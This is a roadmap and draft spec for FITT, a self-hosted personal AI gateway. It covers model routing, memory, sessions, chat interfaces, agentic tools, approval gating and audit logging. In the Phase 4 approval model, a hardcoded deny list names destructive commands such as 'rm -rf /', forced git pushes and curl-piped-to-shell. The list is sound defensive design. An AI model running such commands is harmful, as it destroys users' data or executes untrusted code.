# FITT Roadmap

> **FITT** — *Fred Industries Two Thousand.* A self-hosted, spec-driven personal AI with persistent memory, agentic tools, and multi-interface reach. Built gradually, demoable at every phase.

This roadmap is both the outer shell **and** the draft specs. Each phase contains enough to act on: requirements, a design sketch, and a task list. When a phase begins for real, its inline section is promoted to proper Kiro spec files (`.kiro/specs/<phase>/{requirements,design,tasks}.md`) in the `home-ai-cluster` repo (or whatever the final repo name ends up being) and iterated from there.

---

## Guiding Principles

1. **Reach the inflection point fast.** The first goal is making a local LLM usable from the IDE so the LLM can help build everything else. Everything before that is manual.
2. **Spec-driven from Phase 1 onward.** Manual bootstrap stops when the LLM can follow specs. After that, every phase is written as a Kiro spec.
3. **Use mature tools; don't reinvent.** LiteLLM, Ollama, Tailscale, FastAPI, uv, MCP where they fit. Build the integration, not the components.
4. **Each phase leaves something usable.** Not "foundational work for later phases." Each phase is demoable on its own.
5. **Claude (or any cloud model) for hard turns, local for the rest.** No local-only purity. The goal is escaping *limits*, not eliminating cloud entirely.
6. **Security scales with risk.** Read-only tools: relaxed. Shell and filesystem writes: approval-gated. Home-automation and external comms: hard deny-list + audit.
7. **Models are configuration, not architecture.** LLMs improve monthly. The design never couples to a specific model — clients name logical roles (`fitt-default`, `fitt-smart`), config binds roles to current best-in-class models. Swapping is a config edit.
8. **The agent is honest about its capabilities.** When a request requires a tool the agent doesn't have, it explicitly says what's missing and recommends how to add it. Hallucinating an action, or silently producing a lesser answer when a tool would have given a better one, is a bug.
9. **Live with it before extending it.** After each phase ships, use FITT for at least two weeks before starting the next phase. Your real pain points — not the roadmap's assumptions — drive what comes next. This is the single biggest protection against building features you won't use.
10. **Shareable by construction.** No personal info, machine-specific paths, or secrets ever land in the repo. The repo contains code + `.example` templates; every user brings their own `~/.fitt/config.yaml`, `~/.fitt/secrets.yaml`, and `~/.fitt/` runtime directory. When someone else decides to try FITT, they should need only: clone, install, copy templates, fill in their values. Zero code edits to "make it about me."
11. **Fail loud on detectable misconfigurations.** When the system can tell something's wrong before the user hits a runtime symptom, surface the error early with a clear pointer to the fix. Silent "works but doesn't do what you expect" is the worst failure mode — a user has no idea what to change. The discipline: warn at boot when a detectable problem exists, reject at request time when an ambiguous config would produce wrong results, always include in the error message the file or field to edit. Where auto-detection is feasible (e.g. a known client sending `X-FITT-Client`), use it so users don't have to declare things the system can figure out itself.

## Inspiration sources

Decided 2026-05-15 after a side-by-side install of OpenClaw on the same NAS that runs FITT. Caught the moment of "should I migrate?" and the answer was "keep building FITT, draw inspiration from elsewhere."

- **MeshClaw / OpenClaw** for the personal-AI-assistant shape: skills, channels, multi-interface, "talk to it and it walks you through setup," default-on web search, Google Workspace integration via CLI tools like `gog`. Their `skills/*/SKILL.md` files are MIT-licensed markdown and often portable as-is. When FITT considers a feature in that shape, look first at how OpenClaw does it.
- **OpenCode, Cursor, Kiro, Claude Code** for code-edit / spec-driven workflows. FITT is explicitly NOT a coding agent (per project-overview steering), but borrows discipline patterns: spec-first feature design, structured tool errors, approval-gated mutations.

FITT is not trying to be either. It's a single-user learning project where architecture and use cases come from the author's own needs. Inspiration is welcome; replication for completeness's sake is not.

By Phase 4.9 (2026-05-15) the architectural backbone is done — gateway, memory, sessions, agentic tools, cron, audit, approvals, observability. What's left in the roadmap (memory v1, voice, home assistant, hardening) are real but optional additions. The shift from "execute the next phase" to "live with it and add things opportunistically" is the right shift for now. See the steering file's "Items observed in OpenClaw worth borrowing opportunistically" section for a current pick-list.

---

## Phase Dependencies

```
Phase 0 (manual) ─┐
                  ├─► Phase 1 (gateway) ─► Phase 2 (memory v0)
                  │                        │
                  │                        ▼
                  │                   Phase 2.5 (sessions)
                  │                        │
                  │                        ├─► Phase 3 (telegram) ─► Phase 3.5 (docker hub)
                  │                        │
                  │                        └─► Phase 4 (tools) ─► Phase 4.5 (cron + events)
                  │                             │                    │
                  │                             │                    ├─► Phase 4.6 (e2e harness)
                  │                             │                    │
                  │                             │                    ├─► Phase 4.7 (project_shell)
                  │                             │                    │
                  │                             │                    └─► Phase 5 (lessons + decay)
                  │                             │                         │
                  │                             │                         └─► Phase 6 (spec-runner; reshaped — see note)
                  │                             │
                  │                             ├─► Phase 7 (visibility & traceability)
                  │                             │     │
                  │                             │     └─► Phase 8 (compaction)
                  │                             │           │
                  │                             │           └─► Phase 9 (memory v1: vector / RAG / cross-project)
                  │                             │
                  │                             ├─► Phase 10 (voice)
                  │                             ├─► Phase 11 (home assistant)
                  │                             └─► Phase 12+ (opportunistic: subagents, heartbeat, parallel, ...)
```

Phase 7 is the active one — visibility-and-traceability earned its slot from the
2026-05 granite-narration / context-discovery debugging session, where we found
ourselves ssh'ing into containers to grep logs. Phases 8 and 9 follow as
sub-arcs of "memory done right," each landing when daily friction justifies it.
Phases 10, 11, and 12+ remain genuinely opportunistic.

The visibility / compaction / memory-v1 split (was a single bundled "Phase 7 —
vector memory, admin UI") happened 2026-05-22 after the conversation that
surfaced the granite case made it clear these are three independent threads
with different urgency. See Phase 7's Why-now section for the trail.

---

</content>
</file>## Phase 0 — Bootstrap (Manual, ~30 minutes)

**Goal:** A local LLM reachable from the laptop's IDE. That's it.

**Why no spec:** The work is too small and too manual to benefit from a spec. Specs start when the LLM can help implement them.

**Why Ollama native, not Docker:** GPU passthrough to Docker on Windows (via WSL2 + NVIDIA Container Toolkit) is a well-known time sink. Phase 0's goal is 30 minutes to the inflection point. Native Ollama on Windows talks to the NVIDIA driver directly and Just Works. Docker buys us nothing here — no deployment target, no isolation need, and model volumes would just be bigger and harder to manage. The desktop may run Ollama in Docker later (Phase 1+) because it already needs Docker for Open WebUI, but even that is a judgment call we can make then. For the laptop: native.

**Manual steps:**
1. Install Ollama for Windows on the Predator laptop.
2. `ollama pull qwen2.5-coder:14b`
3. Verify in terminal: `ollama run qwen2.5-coder:14b`, ask it something trivial.
4. Pick an IDE. Options, in recommended order:
   - **VS Code + Continue extension** (free, open source, mature Ollama integration). Default choice.
   - **Kiro (public / external)** if it's installable at home and can be pointed at Ollama. Closest to the work experience, but verify before committing.
   - **Cursor** if you don't mind the subscription. Polished, AI-native, easy Ollama config.
5. Configure the IDE's AI provider:
   - VS Code + Continue: install the extension, open its config, set `provider: ollama`, `model: qwen2.5-coder:14b`, `apiBase: http://localhost:11434`.
   - Kiro / Cursor: whichever settings panel they expose for custom/local models, point it at `http://localhost:11434` with `qwen2.5-coder:14b`.
6. Test a chat from within the IDE — ask it to write a small function.

**Exit criteria:** You can talk to a local LLM inside your laptop's IDE, and it produces useful code responses.

**Expected experience:** Noticeably rougher than Opus. Good enough to help with boilerplate, explanations, and small refactors. Not yet good enough for complex multi-file work — that's fine; Phase 1 fixes it by routing hard turns to Claude.

---

## Phase 1 — Gateway v0 (Spec-driven, ~1 weekend) — FULL SPEC

**Goal:** A single always-on HTTP daemon that exposes an OpenAI-compatible chat endpoint and intelligently routes to Claude API or local Ollama based on the request.

### 1.1 Requirements

#### User Story 1: Unified chat endpoint

As a user, I want a single URL I can point any OpenAI-compatible client at, so that all my AI interactions flow through one place regardless of which backend ends up serving them.

**Acceptance Criteria**
- 1.1.1 The gateway exposes `POST /v1/chat/completions` on the desktop, reachable from any device on my Tailscale network.
- 1.1.2 Requests follow the OpenAI chat-completion schema (messages array, model, stream, etc.).
- 1.1.3 Streaming responses (`stream=true`) are forwarded to the client as Server-Sent Events in OpenAI format.
- 1.1.4 Non-streaming responses return the standard OpenAI JSON shape.
- 1.1.5 The endpoint is not reachable from outside Tailscale (verify with `netstat` that bindings are localhost + Tailscale interface only).

#### User Story 2: Multi-backend model routing

As a user, I want to select the model per-request so I can use Claude for hard problems and local Qwen for cheap ones.

**Acceptance Criteria**
- 2.1 Clients name *aliases* (`fitt-default`, `fitt-smart`, `fitt-fast`); the router resolves aliases to concrete models via config.
- 2.2 Passing an Anthropic-backed alias routes to the Anthropic API.
- 2.3 Passing an Ollama-backed alias routes to the configured endpoint.
- 2.4 Unknown aliases return a 400 with a list of available aliases.
- 2.5 If the primary backend for an alias is unreachable, the gateway falls back to the model's configured fallback and the response includes a header indicating the actual backend used.

#### User Story 3: Authentication

As the owner, I want the gateway to reject requests that aren't mine so that someone else on my Tailscale network can't freely spend my Anthropic credits.

**Acceptance Criteria**
- 3.1 All `/v1/*` endpoints require an `Authorization: Bearer <token>` header.
- 3.2 Valid tokens are configured in a server-side secrets file (not environment variables committed to git).
- 3.3 Invalid or missing tokens return 401.
- 3.4 Health endpoints (`/health`, `/ready`) do not require authentication.

#### User Story 4: Always-on operation

As a user, I want the gateway to survive reboots and crashes so I don't have to manually restart it.

**Acceptance Criteria**
- 4.1 The gateway runs as a Windows service (or equivalent auto-restart mechanism) on the iBUYPOWER desktop.
- 4.2 If the process crashes, it auto-restarts within 30 seconds.
- 4.3 After a full reboot, the gateway is reachable within 60 seconds without any manual steps.

#### User Story 5: Observability

As a developer, I want to see what the gateway is doing so I can debug routing and cost issues.

**Acceptance Criteria**
- 5.1 Every request is logged with: timestamp, alias, resolved model, backend chosen, latency, token counts (input/output), and — when applicable — estimated cost in USD.
- 5.2 Logs go to a rotating file in `~/.fitt/logs/gateway.log` (daily rotation, 30-day retention).
- 5.3 `GET /v1/models` returns the list of configured aliases and their current resolvability.
- 5.4 `GET /health` returns 200 if the gateway process is alive.
- 5.5 `GET /ready` returns 200 only if at least one backend for each alias is reachable.
- 5.6 A `fitt cost` CLI command summarizes current-month spend by reading the log file. (Trivial; no DB needed.)

**Not in scope for Phase 1:** A built-in server-side cost *cap*. Relying on Anthropic console's native spend limits is simpler and just as safe. If a bill surprise ever happens, Phase 10 can add enforcement. Keeping it out saves a subsystem we might never need.

### 1.2 Design

#### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│    Clients (all OpenAI-compatible, on Tailscale)            │
│    - Kiro / Continue / Cursor (IDE chat)                    │
│    - curl / httpie (testing)                                │
│    - future: Telegram bot, dashboard, MCP host              │
└────────────────────────────┬────────────────────────────────┘
                             │ HTTPS
                             │ Bearer token auth
                             ▼
┌─────────────────────────────────────────────────────────────┐
│  FITT Gateway — FastAPI on iBUYPOWER desktop :8080          │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Auth middleware (Bearer token)                     │    │
│  │  Request logger (with cost estimation)              │    │
│  └─────────────────────────────────────────────────────┘    │
│              │                                              │
│              ▼                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  LiteLLM router (alias → model → backend)           │    │
│  │  - unified OpenAI schema                            │    │
│  │  - per-alias fallback                               │    │
│  └────────┬────────────────────┬────────────────┬──────┘    │
│           │                    │                │           │
└───────────┼────────────────────┼────────────────┼───────────┘
            │                    │                │
            ▼                    ▼                ▼
   ┌────────────────┐   ┌─────────────────┐  ┌──────────────┐
   │ Anthropic API  │   │ Ollama @ laptop │  │ Ollama @     │
   │ (Claude Sonnet,│   │ (Qwen 14B)      │  │ desktop      │
   │  Opus)         │   │ via Tailscale   │  │ (Qwen 7B)    │
   └────────────────┘   └─────────────────┘  └──────────────┘
```

#### Module design

- `gateway/app.py` — FastAPI application factory. Registers middleware and routes.
- `gateway/auth.py` — Bearer token middleware. Reads allowed tokens from `~/.fitt/secrets.yaml`.
- `gateway/router.py` — Thin wrapper around LiteLLM. Handles alias → model → backend resolution, streaming translation, fallback.
- `gateway/cost.py` — Pure function: `(model, input_tokens, output_tokens) → usd`. Used by the logger. No DB, no middleware.
- `gateway/logging_config.py` — Structured logging via `structlog` to rotating file.
- `gateway/models.py` — Pydantic models for request/response validation.
- `gateway/health.py` — Health/readiness/models endpoints.
- `gateway/cli.py` — `fitt` CLI for `fitt cost`, `fitt status`, future subcommands.

#### Configuration

`~/.fitt/config.yaml`:

```yaml
server:
  host: 0.0.0.0        # Windows Firewall restricts inbound to Tailscale interface
  port: 8080
  log_level: info

# Logical roles clients ask for. IDE, Telegram, etc. only ever name these.
# Swapping the underlying model is a config-only change.
aliases:
  fitt-default: qwen-coder-big      # everyday coding turns
  fitt-smart:   claude-sonnet       # "hard turns" escape hatch
  fitt-fast:    qwen-coder-small    # cheap classification / helpers

# Concrete models.
models:
  - id: claude-sonnet
    backend: anthropic
    model: claude-sonnet-4-5         # update when a new Claude drops
    cost_per_mtok_in: 3.00
    cost_per_mtok_out: 15.00

  - id: claude-opus
    backend: anthropic
    model: claude-opus-4-5           # optional, for truly hard turns
    cost_per_mtok_in: 15.00
    cost_per_mtok_out: 75.00

  - id: qwen-coder-big
    backend: ollama
    endpoint: http://<laptop-tailscale-ip>:11434
    model: qwen2.5-coder:14b
    fallback: qwen-coder-small

  - id: qwen-coder-small
    backend: ollama
    endpoint: http://localhost:11434
    model: qwen2.5-coder:7b

logging:
  dir: ~/.fitt/logs
  retention_days: 30
```

**Design rule:** no client ever hardcodes `qwen2.5-coder:14b` or similar. Clients name aliases; config binds aliases to models. Models are configuration, not architecture (Principle 7).

`~/.fitt/secrets.yaml` (mode 0600, never committed):

```yaml
anthropic_api_key: sk-ant-xxx
allowed_tokens:
  - name: personal
    token: <long random string>
```

#### Tools and dependencies

- **FastAPI** + **uvicorn**: HTTP server.
- **LiteLLM**: model routing and provider abstraction.
- **structlog**: structured logging.
- **pydantic**: request validation.
- **NSSM** or `sc.exe`: Windows service wrapper.

#### Security

- Gateway binds to `0.0.0.0`; Windows Defender Firewall rule restricts inbound 8080 to the Tailscale interface only. Verify post-install with `netstat` and an external port-scan.
- Secrets file permissions checked on startup; refuse to start if world-readable.
- Bearer tokens compared with `secrets.compare_digest` to prevent timing attacks.
- Anthropic API key never logged. Token counts and alias names logged; full prompt/response bodies not logged unless `log_bodies: true` is set for debugging.

#### Failure handling

- **Upstream 429 / 529 (Claude overloaded):** surface as 503 to client with `Retry-After` header. Don't retry automatically — let the client decide.
- **Ollama unreachable:** fall back to the alias's configured fallback. Log the failover.
- **No backend available for an alias:** return 503 with a clear error naming the alias and the attempted backends.
- **Streaming mid-response failure:** terminate the stream cleanly with an `[ERROR]` delta event; don't silently truncate.

#### Correctness properties

**Property 1 — Alias routing determinism**
*For any* request with a known alias, the resolved backend must be the primary (or configured fallback if unreachable), never any other backend.
*Validates: 2.1, 2.2, 2.3, 2.5*

**Property 2 — Auth enforcement**
*For any* `/v1/*` request without a valid Bearer token, the response is 401 and no backend call is made.
*Validates: 3.1, 3.3*

**Property 3 — Streaming passthrough fidelity**
*For any* streaming request, the event stream forwarded to the client contains the same tokens in the same order as the upstream, with only OpenAI-format envelope rewriting.
*Validates: 1.1.3*

**Property 4 — Cost logging accuracy**
*For any* completed request to a priced backend, the logged cost in USD equals `cost_per_mtok_in × input_mtokens + cost_per_mtok_out × output_mtokens` within a rounding tolerance of $0.0001.
*Validates: 5.1, 5.6*

### 1.3 Tasks

#### Phase 1a — Scaffold

- [ ] 1. Initialize `home-ai-cluster` git repo on the desktop; move `FITT_ROADMAP.md` and `RETRO_KITT_PRD.md` (rename the PRD too) into it.
- [ ] 2. Create `gateway/` Python package with `pyproject.toml`, dev dependencies (pytest, ruff, mypy), and a stub `app.py`.
- [ ] 3. Add `.gitignore` entries for `secrets.yaml`, `*.db`, `logs/`, `.venv/`.
- [ ] 4. Commit and push to private GitHub repo.

#### Phase 1b — Minimum viable endpoint

- [ ] 5. Add FastAPI + uvicorn dependencies. Implement `POST /v1/chat/completions` with a hardcoded Claude Sonnet backend.
- [ ] 6. Add `/health` and `/ready` endpoints.
- [ ] 7. Smoke test locally with `curl` + a real Anthropic API key.
- [ ] 8. Verify streaming works with `stream=true`.

#### Phase 1c — Auth

- [ ] 9. Implement Bearer-token middleware reading `~/.fitt/secrets.yaml`.
- [ ] 10. Add secrets-file permission check on startup.
- [ ] 11. Write tests for auth: missing token, wrong token, valid token.

#### Phase 1d — LiteLLM routing

- [ ] 12. Replace the hardcoded Claude backend with a LiteLLM router configured from `config.yaml`, using the alias → model pattern.
- [ ] 13. Add Ollama backends (laptop and desktop) to the config.
- [ ] 14. Implement fallback: when a primary backend is unreachable, try the model's `fallback` id. Log the failover.
- [ ] 15. Add the actual-backend header (`X-FITT-Backend`) to responses.
- [ ] 16. Write routing tests with mocked backends.
- [ ] 17. Implement failure-handling behavior documented in the design (5xx pass-through with `Retry-After`, clean stream termination on error).

#### Phase 1e — Observability

- [ ] 18. Configure structlog with rotating file handler.
- [ ] 19. Add request-logging middleware (no prompt bodies by default).
- [ ] 20. Implement cost function `gateway/cost.py` and wire into the logger.
- [ ] 21. Implement `fitt cost` CLI: tails the log, aggregates MTD USD per model, prints a summary.
- [ ] 22. Implement `GET /v1/models` returning configured aliases with current resolvability.

#### Phase 1f — Production install

- [ ] 23. Write `scripts/install-service.ps1` — registers the gateway as a Windows service via NSSM or `sc.exe`.
- [ ] 24. Set Windows Defender Firewall rules: allow inbound 8080 on Tailscale interface only.
- [ ] 25. Verify with `netstat` and an external port-scan that the gateway is not reachable from the public Wi-Fi NIC.
- [ ] 26. Set an Anthropic console spend limit on the API key (monthly cap of your choice).
- [ ] 27. Reboot the desktop; verify gateway is reachable within 60s without manual intervention.

#### Phase 1g — Wire up the IDE

- [ ] 28. On the laptop, configure Kiro / Continue / Cursor to use the gateway's Tailscale URL as an OpenAI-compatible provider.
- [ ] 29. Verify IDE chat works with `fitt-smart` and with `fitt-default`.
- [ ] 30. End-to-end smoke test: write a new spec, ask the smart alias to implement it through the gateway.

**Exit criteria:** From the laptop IDE, chat requests flow IDE → Tailscale → desktop gateway → Anthropic (for smart) or laptop Ollama (for default) → back. Gateway survives a reboot. `fitt cost` shows real spend.

**Known concerns (track as issues, don't block Phase 1):**
- Fallback is one-level. Multi-level chains deferred.
- Cost telemetry is best-effort; log-derived, not transactional.

---

## Phase 2 — Memory v0 (Spec-driven, ~1 weekend)

**Goal:** The gateway remembers. Identity (always-loaded) and today's daily history (append-only markdown) survive restarts.

**Requirements sketch:**
- Identity files in `~/.fitt/identity/{user,soul,tools}.md` injected into every system prompt.
- Daily history in `~/.fitt/history/YYYY-MM-DD.md`, append-only, one entry per turn.
- On every request, **today only** is loaded and injected between identity and the user message. (Yesterday loading defers to Phase 2.5, where session semantics settle the question of "scope of memory" properly.)
- "Keys on the counter" test: tell it a fact, restart gateway, ask about the fact same day, get the right answer.

**Design sketch:**
- New `gateway/memory.py` module.
- Memory injection happens in the request pipeline before LiteLLM dispatch.
- No vector DB. No Mem0. Plain text files only.
- Write-through: when a response completes, append `## <HH:MM> user` and `## <HH:MM> assistant` blocks to today's history file.

**Tasks sketch:**
1. Create identity templates with sensible defaults.
2. Memory-load function: read today's markdown file.
3. Inject into system message before dispatch.
4. Append-on-completion hook.
5. "Keys on the counter" integration test.

**Known concerns:**
- Today's log can hit 10k+ tokens by evening. Context budget gets tight. Phase 2.5 or Phase 7 handles compaction.
- "Memory is present" ≠ "memory is used." Claude uses context well; Qwen 14B less so. Expect the magic to be partial until Phase 7.

*Full three-file spec to be written when this phase starts.*

---

## Phase 2.5 — Sessions (Spec-driven, ~1 weekend)

**Goal:** Define what a session is, so Phases 3+ have a consistent model to build on.

**Why this phase:** Without explicit session semantics, every interface (Telegram, IDE, cron) reinvents its own scoping. Two viable models: per-channel isolation (each Slack thread, IDE window, etc. its own scope) or per-sender isolation (one scope per user across all interfaces). FITT picks a third: **one default session shared across interfaces, with explicit sub-sessions for side projects or experiments.**

**Requirements sketch:**
- A session has an `id`, a `name`, a `created_at`, and an attached memory scope.
- Default session is `main`. Messages from any interface (Telegram DM, IDE, CLI) without an explicit session go to `main`.
- Users can create named sessions (`fitt session new retroai-debug`) and address them explicitly from the CLI or Telegram.
- Session state persists across gateway restarts.
- Each session has its own daily history file but shares identity.

**Design sketch:**
- `~/.fitt/sessions/<id>/history/YYYY-MM-DD.md` structure.
- Session resolution middleware in the gateway: picks a session based on a header, query param, or default.
- `fitt session` CLI: `list`, `new`, `rename`, `archive`.
- Memory load now reads session-scoped history.

**Tasks sketch:**
1. Session model (Pydantic) and on-disk layout.
2. Session resolution middleware.
3. CLI subcommand `fitt session`.
4. Migrate Phase 2's flat history into `main` session.
5. Tests for session isolation and default-session behavior.

**Known concerns:**
- Context switching across sessions (keywords, cwd) is deliberately deferred. v0 is "explicit or main."

*Full three-file spec to be written when this phase starts.*

---

## Phase 3 — Telegram + Browser Interface (Spec-driven, ~1 weekend)

**Goal:** Talk to FITT from your phone (Telegram) and from any browser (Open WebUI, self-hosted).

**Requirements sketch:**
- `python-telegram-bot` service alongside the gateway.
- Allowlist on your Telegram user ID.
- Open WebUI container pointed at the FITT gateway as an OpenAI-compatible provider.
- Both interfaces forward messages to the gateway, attaching the `main` session by default.
- Telegram handles text and images (forward to gateway as multimodal). Voice notes deferred to Phase 8.
- Telegram streams responses back as they arrive (edit-message pattern).
- A `/session <name>` Telegram command switches which session subsequent messages target. Open WebUI uses its own session concept mapped to FITT sessions via system prompt or header.

**Design sketch:**
- New process: `telegram-bot/` (separate service, talks to gateway via localhost HTTP).
- Open WebUI: Docker container, configured via env vars to point at the gateway.
- Both use the gateway's Bearer token to authenticate.
- One bot, one allowlisted user, many sessions.

**Tasks sketch:**
1. Register bot with BotFather, store token.
2. Telegram allowlist middleware.
3. Telegram message forwarding to gateway with session resolution.
4. Streaming reply via message edit.
5. Image passthrough.
6. `/session` Telegram commands.
7. Add Open WebUI as a Docker compose service pointed at the gateway (Tailscale-reachable).
8. Verify Open WebUI works from phone browser and desktop browser.
9. Service registration for the Telegram bot (Windows service or WSL systemd).

**Known concerns:**
- Telegram is not the approval UI yet. Phase 4 will route approval prompts back to whichever interface originated the request.
- Open WebUI has its own session abstraction that doesn't perfectly map to FITT sessions. v0 accepts some awkwardness; revisit if it gets painful.
- Open WebUI's own auth model (its signup/login) is separate from the gateway's Bearer token — lock down Open WebUI to allowlisted users independently.

*Full three-file spec to be written when this phase starts.*

---

## Phase 3.5 — Docker-first Hub (Spec-driven, ~1 weekend) — CODE LANDED

**Goal:** Make the hub portable. Same code, same config shape, running in containers on a QNAP NAS (or any Docker host) instead of as Windows services on a desktop.

**Status:** All implementation tasks (1-7) landed on `main`. The
QNAP pilot (task 8) is in progress on the author's TS-253Be.
Phase 3.5 will flip to "shipped" once the hub has been running
for 3 days without intervention.

**What it builds:**

- `gateway/Dockerfile` and `telegram-bot/Dockerfile` (multi-stage, uv-based, python:3.11-slim).
- Root `docker-compose.yml` defining gateway + telegram-bot + open-webui as three services sharing a bind-mounted `$FITT_HOME`.
- `docker-compose.override.yml.example` for a hot-reload dev loop on the laptop.
- Quickstart Part A splits into A.1 (Windows/NSSM) and A.2 (Docker). Parts B and C unchanged.
- Retires `install-open-webui.ps1` (compose subsumes it). Keeps `install-service.ps1` and `install-telegram-bot.ps1`.

**Not in scope:**

- **Satellites in Docker.** Ollama stays native — GPU passthrough overhead isn't worth it, and Phase 0's reasoning ("Docker buys us nothing here") still holds for satellites.
- **Image publishing.** Phase 3.5 builds images on the target host. A future CI/CD phase flips to prebuilt images on GHCR.
- **Admin web UI.** Separate future phase; Phase 3.5 only containerizes what exists.

**Release pipeline (Shape 1):** build on the target host, deploy via `git pull && docker compose up -d`. Simplest possible. Two follow-up shapes documented in the spec for when the friction justifies the work: Shape 2 (GHCR + GitHub Actions) and Shape 3 (auto-deploy, probably never).

**Exit criteria:** Author's TS-253Be runs the hub for 3 days without intervention. Phone, IDE, and Telegram all work via the NAS's Tailscale IP. Windows hub path still works on a fresh install.

*Full spec: `.kiro/specs/phase3.5-docker-hub/`.*

---

## Phase 4 — Agentic Tools (Spec-driven, ~2 weekends)

**Goal:** FITT offers its own tool system for non-IDE clients (Telegram, Open WebUI, curl). Tools dispatch to wherever the work actually happens — hub-local for general tools, via SSH to the project's declared host for file/git/shell operations. The IDE case (Continue) stays pass-through: Continue supplies its own toolkit; FITT is transparent.

**Key design decisions:**

- **Two layers of tool plumbing.** Inline Python for core tools (simple, fast, no subprocess). External MCP servers for the long tail (Slack, Jira, Postgres, Home Assistant). To the model, they're both just function calls.
- **Execution follows the project.** The hub runs the gateway, but file/git/shell tools execute where the code lives. Each project in the registry declares an `ssh_host` (may be the hub itself for hub-local projects). Tools wrap their operation in ssh when needed. Satellite roles: a machine can be an inference satellite (Ollama), an execution host (project code + tests), both, or neither.
- **Tool forwarding, not replacement.** When a client sends a `tools` array (Continue in Agent mode does this), the gateway appends FITT's session-aware tools rather than overwriting. Continue keeps its own tools; FITT contributes `spec_*` + cron + event tools on top.
- **Spec-aware tools are first-class.** `spec_read`, `spec_next_task`, `spec_mark_task`, `spec_list` understand the `.kiro/specs/<feature>/{requirements,design,tasks}.md` convention. What makes a spec-driven workflow portable across Telegram / IDE / CLI.
- **Cron and lessons deferred.** Phase 4.5 adds cron + proactive notifications. Phase 5 adds lessons. Phase 4 stays focused on "tools + approval + audit + registry."

**Core inline tools (shipped with FITT):**

- `read_file`, `write_file`, `edit_file` (writes scoped to registered projects; routed via ssh when project has an `ssh_host`)
- `list_directory`, `grep_repo`, `glob_search`
- `git_status`, `git_diff`, `git_commit` (writes gated)
- `run_tests` (runs the project's configured test command)
- `http_get` (with allow/deny on hostnames)
- `spec_read`, `spec_next_task`, `spec_mark_task`, `spec_list`
- `list_capabilities` (enumeration tool for capability-awareness)

**MCP for everything else:** configured in `config.yaml` under `mcpServers:`; gateway spawns, supervises, surfaces tools alongside inline ones.

**Capability awareness (Principle 8):**
- System prompt auto-generates a capabilities summary from the loaded tool list.
- When the agent determines a request needs a capability it doesn't have, it replies in a standard format (*what's missing, what to install or configure*).
- Declined-for-missing-capability events log to `~/.fitt/capability_gaps.log` as a natural backlog.
- `fitt capability-gaps` CLI prints the backlog grouped by frequency.

**Approval model — four buckets:**
- `auto` — tool runs without prompting.
- `ask` — approval required; routes to the originating client if it has a native UI, else Telegram.
- `trust_session` — "ask" until the user clicks "trust rest of session"; then auto for that session's remainder.
- `yolo` — auto-approve everything; time-boxed with automatic expiry (default 30 min for Telegram/WebUI, 6 h for IDE/CLI).
- `block` — hardcoded deny list (in code, not config). Covers `rm -rf /`, `git push --force`, curl-piped-to-shell, and obvious destructive patterns.

**Per-client tokens** in `secrets.yaml` carry a `client:` tag and default trust level (`ide` / `telegram` / `webui` / `cli`). Tool policy can override per-client.

**Default policies by client:**
- **IDE (Continue)** — writes auto-approve (Continue already shows diffs natively); shell-like tools (`run_tests`, `git_commit`) still `ask`.
- **Telegram** — reads auto; writes and shell-like tools `ask` (inline-keyboard prompt).
- **Open WebUI** — reads scoped to registered projects; writes `block`; no shell. Least trust by default.
- **CLI on the hub** — writes `ask`; shell-like tools `ask`.

**Audit log:**
- Append-only `~/.fitt/audit.jsonl` with HMAC chain.
- `fitt audit verify` CLI checks chain integrity.
- Every tool call logged: timestamp, session, client, tool, arguments, outcome, approval decision.

**Module design:**
- `gateway/tools/` — package of inline tool implementations.
- `gateway/tools/ssh_backend.py` — dispatches file/git/shell tools via ssh when the project has an `ssh_host`.
- `gateway/mcp_client.py` — MCP server supervisor and tool surfacing.
- `gateway/tool_registry.py` — unified registry across inline + MCP, source of truth for schemas and policies.
- `gateway/approval.py` — approval-gate middleware, routes prompts back to the originating client (Telegram fallback).
- `gateway/audit.py` — append-only audit log with HMAC chain.
- `gateway/capabilities.py` — system-prompt capability summary + gap logging.
- `gateway/deny_list.py` — hardcoded deny patterns.
- `gateway/projects.py` — project registry (schema, CLI, file watcher) including `ssh_host`.

**Known concerns:**
- Local 14B models handle tool calling less reliably than cloud frontier models. An eval harness measures it; routing policy downgrades weaker aliases to a minimal tool set.
- Approval UX on Telegram needs a "trust for this session" option or approval fatigue kills the workflow.
- MCP server crash storms cascade if the supervisor retries too aggressively. Exponential backoff.
- Continue's own rules (`.continue/rules/`) and FITT's server-side system prompt can conflict. Separation: FITT's prompt stays generic (identity, active specs, capabilities); client-side rules are client-specific (editing conventions, tool usage preferences).
- SSH dispatch adds ~100-300ms per tool call. Acceptable at task-runner granularity (minutes per task); noisy for interactive chat. Acceptable tradeoff for Phase 4.

*Full spec: `.kiro/specs/phase4-tools/` (to be written when this phase starts).*

---

## Phase 4.5 — Cron + Proactive Notifications (Spec-driven, ~1 weekend)

**Goal:** FITT can do things on a schedule, and tell you about them. Unlocks "monitor the training job and tell me when it's done" without re-explaining each time (though lessons in Phase 5 is what makes it feel magical).

**Key work:**

- **Cron subsystem.** `$FITT_HOME/cron.json` with atomic writes + file lock (hub-side persistence). Three schedule kinds: `every <seconds>` (interval, min 60s), `at <timestamp>` (one-shot), `cron <5-field expr>`. Each job fires a fresh session with the job's message as the user prompt.
- **Cron tools.** `cron_add`, `cron_list`, `cron_update`, `cron_remove`, `cron_pause`, `cron_resume`. All respect the Phase 4 approval policy (`cron_add` in `ask` bucket; once the cron exists, its internal tool calls follow per-cron policy).
- **Per-cron policy fields.** `silent: bool` (suppresses auto-delivery; agent decides via `send_message`), `approval_mode: "" | "auto"`, `session_key` (who created it, for scoped removal).
- **Event log.** Append-only `$FITT_HOME/events.jsonl`. Every notable async event (cron fired, tool call needing approval, task completed, etc.) logged with metadata: `kind`, `timestamp`, `session_key`, related IDs, human-readable `summary`.
- **Proactive delivery.** Every event pushed to Telegram by default. A `send_message` tool the agent can call to emit custom events (non-cron). The **same push channel** is what closes the Phase 4 approval-UI rough edge (tool approved > 45s after the prompt → chat turn already returned → result delivered as a new Telegram message instead of being orphaned). Phase 4 tasks.md flags this as a known limitation with a pointer here.

  Related UX gap that the push channel also fixes: today's bot replies by **editing** a placeholder message as the stream arrives. Telegram suppresses notifications on edits (only new messages notify). So if the user asks a long-running question and switches apps, the final response arrives silently — no phone notification, the message is just "there" when they return. Phase 4.5's push channel posts responses as new messages, which restores the notify-on-completion behavior users expect.
- **`fitt inbox` CLI.** List events with filters (`--since`, `--kind`, `--session`). No web UI in this phase; Telegram + CLI is enough.

**Scope boundaries:**

